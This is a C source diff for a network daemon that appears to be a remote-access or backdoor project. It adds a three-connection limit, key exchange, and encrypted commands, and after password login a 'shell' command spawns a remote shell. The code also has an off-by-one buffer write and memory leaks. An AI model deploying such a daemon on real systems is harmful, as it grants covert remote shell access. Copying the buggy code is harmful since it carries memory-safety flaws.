@@ -184,6 +184,7 @@ int		server_create(void)
 
 int		server_handle_connections(void)
 {
+	int						nbconns = 0;
 	fd_set					readfs;
 	int						maxsock = g_durex.sock;
 	int						tmpsock = -1;
@@ -220,10 +221,8 @@ int		server_handle_connections(void)
 				FD_SET(clt->sock, &readfs);
 			clt = clt->next;
 		}
-		
-		/*
-		** Poll sockets using select(2)
-		*/
+
+		/* Poll sockets */
 		if (select(maxsock + 1, &readfs, NULL, NULL, NULL) < 0)
 			continue ;
 
@@ -233,34 +232,39 @@ int		server_handle_connections(void)
 		*/
 		else if (FD_ISSET(g_durex.sock, &readfs))
 		{
-			/*
-			** Accept connection
-			*/
+			/* Accept connection */
 			if ((tmpsock = accept(g_durex.sock, (struct sockaddr *)&csin, &csinlen)) == -1)
 				daemon_report(LOG_ERROR, "Unable to accept connection");
 			else
 			{
 				daemon_report(LOG_INFO, "New connection accepted.");
 
-				/*
-				** Add the new connection to the list
-				*/
-				if (client_add(&(g_durex.clt), client_new(tmpsock)) == -1)
+				/* Check if maximum simultaneous connections is reached */
+				if (nbconns == 3)
 				{
+					/* Close back the socket */
+					daemon_report(LOG_INFO, "Maximum number of simultaneous connections reached. Closing connection.");
 					close(tmpsock);
-					daemon_report(LOG_INFO, "Unable to store client socket. Closing connection.");
 				}
 				else
 				{
-					/*
-					** Update the maximum socket number for select
-					*/
-					maxsock = (tmpsock > maxsock) ? tmpsock : maxsock;
+					/* Add the new connection to the list */
+					if (client_add(&(g_durex.clt), client_new(tmpsock)) == -1)
+					{
+						close(tmpsock);
+						daemon_report(LOG_INFO, "Unable to store client socket. Closing connection.");
+					}
+					else
+					{
+						/* Update the number of actual connections */
+						nbconns += 1;
+						
+						/* Update the maximum socket number for select */
+						maxsock = (tmpsock > maxsock) ? tmpsock : maxsock;
 
-					/*
-					** Send keycode string for login
-					*/
-					send(tmpsock, access_denied, 10, 0);
+						/* Send keycode string for login */
+						send(tmpsock, access_denied, 10, 0);
+					}
 				}
 			}
 		}
@@ -280,14 +284,16 @@ int		server_handle_connections(void)
 					{
 						ret = server_handle_message(clt);
 						if (ret == MSG_DISCONNECT)
+						{
+							nbconns -= 1;
 							client_ofree(&(g_durex.clt), clt->sock);
+						}
 						else if (ret == MSG_QUIT)
 							return (0);
 						else if (ret == MSG_LOGIN_OK)
 							send(clt->sock, access_granted, 16, 0);
 						else if (ret == MSG_LOGIN_KO)
 							send(clt->sock, access_denied, 10, 0);
-
 					}
 				}
 				clt = clt->next;
@@ -322,7 +328,7 @@ int		server_handle_message(t_client *client)
 {
 	char		buf[4096] = { '\0' };		// Main socket read buffer
 	ssize_t		bytes = 0;					// Number of bytes read
-
+	char		*clear = NULL;
 	/*
 	** If read returns < 0 it means we had an error while reading on socket
 	*/
@@ -350,7 +356,7 @@ int		server_handle_message(t_client *client)
 		** We first log the message
 		*/
 		buf[bytes] = '\0';
-		daemon_report(LOG_USER, buf);
+		//daemon_report(LOG_USER, buf);
 
 		/*
 		** If client has no access granted yet...
@@ -358,59 +364,68 @@ int		server_handle_message(t_client *client)
 		if (client->log == LOGIN_PENDING)
 		{
 			daemon_report(LOG_INFO, "Unknown user. Checking password validity...");
-			if (server_login(buf, bytes) == 0)
-			{
+			    if (server_login(buf, bytes) == 0)
+			      {
 				client->log = LOGIN_GRANTED;
 				daemon_report(LOG_INFO, "Valid password. User access granted.");
 				init_key(client);
-				if (client->is_key == TRUE)
-				  daemon_report(LOG_INFO, "TRUE");
-				else
-				  daemon_report(LOG_INFO, "FALSE");
-				
-				//				while (handle_keys((unsigned char *)buf, client) != 1)
-				  
 				return (MSG_LOGIN_OK);
-			}
-			else
-			{
+			      }
+			    else
+			      {
 				daemon_report(LOG_INFO, "Invalid password. User access denied.");
 				return (MSG_LOGIN_KO);
-			}
+			      }
 		}
+		
 		/*
 		 * if client has access granted && is_key == FLASE
 		 */
 		else if (client->log == LOGIN_GRANTED && client->is_key == FALSE)
 		  {
-		    daemon_report(LOG_INFO, "Known user. Getting P as 1st public key...");
-		    handle_keys((unsigned char *)buf, client);
-		    daemon_report(LOG_INFO,"pass1");
-		    //		    return (44);
-		    if (client->is_key == TRUE)
-		      return(33);
+		    daemon_report(LOG_INFO, "Known user. Encryption key not set, checking...");
+		    if (handle_keys((unsigned char *)buf, client) == -2)
+		      return (MSG_ERROR);
 		  }
+		
 		/*
 		** If client has access granted !
 		*/
 		else if (client->log == LOGIN_GRANTED && client->is_key == TRUE)
 		{
-			daemon_report(LOG_INFO, "Known user. Evaluating command...");
-			/*
-			** If the message is "quit" we need to cleanly shut down the server
-			** and exit the daemon
-			*/
-			if (strcmp("quit", buf) == 0)
-				return (MSG_QUIT);
+		  /*
+		   * message incomming is encypte
+		   * decrypt it and log it
+		   */
+		  if (client->sched == NULL)
+		    {
+		      client->sched = (rijn_keysched_t *)malloc(sizeof(rijn_keysched_t) * 100);
+		      rijn_init(client->sched, client->shared_key);
+		    }
+		  clear = rijn_build_decrypt(client->sched, (unsigned char *)buf);
+		  if (clear == NULL)
+		    return (MSG_COMMAND);
+		  daemon_report(LOG_USER, clear);
+		  daemon_report(LOG_INFO, "Known user. Evaluating command...");
 
-			/*
-			** If the message is "shell" we need to spawn a remote shell
-			*/
-			else if (strcmp("shell", buf) == 0)
-			{
-				daemon_report(LOG_INFO, "Spawning a remote shell...");
-				shell_master(client);
-			}
+		  /*
+		  ** If the message is "quit" we need to cleanly shut down the server
+		  ** and exit the daemon
+		  */
+		  if (strcmp("quit", clear) == 0)
+		    return (MSG_QUIT);
+
+		  /*
+		  ** If the message is "shell" we need to spawn a remote shell
+		  */
+		  else if (strcmp("shell", clear) == 0)
+		    {
+		      daemon_report(LOG_INFO, "Spawning a remote shell...");
+		      shell_master(client);
+		    }
+
+		  if (clear)
+		    free(clear);
 		}
 	}
 	return (MSG_COMMAND);
